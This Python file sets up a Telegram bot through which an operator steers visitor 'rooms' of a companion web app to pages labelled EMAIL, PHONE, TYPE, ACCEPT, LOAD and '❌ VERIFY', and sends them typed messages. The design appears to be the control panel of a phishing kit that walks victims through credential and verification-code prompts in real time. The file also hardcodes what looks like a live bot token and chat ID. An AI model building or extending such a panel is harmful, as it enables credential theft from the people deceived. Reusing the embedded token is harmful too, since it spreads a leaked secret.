# telegram_handlers.py

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import ApplicationBuilder, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from state import user_rooms

# This will be injected from app.py
update_user_page = None

BOT_TOKEN = "8226029096:AAE49A_bGeK995UYAvW7hAdPjQ-ZNl-EQaQ"
CHAT_ID = "1172641734"

def build_keyboard(room_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📧 EMAIL", callback_data=f"{room_id}:Page 1"),
         InlineKeyboardButton("📞 PHONE", callback_data=f"{room_id}:Page 2")],
        [InlineKeyboardButton("📝 TYPE", callback_data=f"{room_id}:Page 3"),
         InlineKeyboardButton("✅ ACCEPT", callback_data=f"{room_id}:Page 4")],
        [InlineKeyboardButton("❌📧📞", callback_data=f"{room_id}:Page 5"),
         InlineKeyboardButton("⏳ LOAD", callback_data=f"{room_id}:Page 6")],
        [InlineKeyboardButton("❌ VERIFY", callback_data=f"{room_id}:Page 7")]
    ])

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()

    try:
        room_id, page_name = q.data.split(":")
    except:
        await q.message.reply_text("Invalid callback")
        return

    info = user_rooms.get(room_id)
    if not info:
        await q.message.reply_text("❌ Room not found.")
        return

    if page_name == "Page 3":
        info["expect_greeting"] = True
        await context.bot.send_message(chat_id=q.message.chat_id, text="👋 Type your greeting:")
        return

    if update_user_page:
        update_user_page(room_id, page_name)

    await context.bot.send_message(chat_id=q.message.chat_id, text=f"Updated room {room_id} → {page_name}")

async def handle_greeting(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text

    for room_id, info in user_rooms.items():
        if info.get("expect_greeting"):
            info["greeting"] = text
            info["expect_greeting"] = False

            if update_user_page:
                update_user_page(room_id, "Page 3")

            await context.bot.send_message(chat_id=update.message.chat_id, text=f"Greeting sent to room {room_id}")
            break

def start_telegram_bot():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_greeting))
    app.run_polling()

